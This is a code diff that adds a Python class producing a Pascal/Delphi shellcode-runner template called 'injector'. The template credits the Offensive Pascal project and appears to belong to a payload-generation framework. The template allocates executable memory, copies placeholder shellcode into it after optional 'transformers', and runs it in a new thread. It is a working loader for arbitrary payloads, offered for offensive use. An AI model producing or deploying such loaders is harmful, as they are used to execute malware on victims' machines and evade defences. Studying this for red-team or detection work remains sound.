@@ -1,0 +1,60 @@
+class shellcoderunner:
+
+    def imports(self) -> list[str]:
+        return ['windows',
+                'Classes'
+                ]
+
+    def compilerOptions(self) -> list[str]:
+        return []
+
+    def template(self) -> str:
+        return """
+{{
+    this one is part of repo published on github under the name of Offensive Pascal
+    Pascal is a great and still up to date :)
+    these projects can be compilied using FreePascal (FPC)
+    or Delphi
+
+    author : @zux0x3a
+    site :   0xsp.com / ired.dev
+
+    https://github.com/0xsp-SRD/OffensivePascal
+
+}}
+
+program injector;
+
+{{$mode delphi}}
+
+uses
+    Classes,windows;
+
+{codeblocks}
+
+procedure inject_shell;
+
+var
+    shellcode : array of byte;
+    hThread: Handle;
+    addr: Pointer;
+    ThreadId: LongWord;
+
+begin
+
+    {shellcode}
+    {transformers}
+
+    addr := VirtualAlloc(nil, {shellcodeSize}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    CopyMemory(addr,shellcode,{shellcodeSize});
+    hThread := CreateThread(nil, 0, addr, nil, 0, ThreadId);
+
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+end;
+
+begin
+    inject_shell;
+end.
+"""
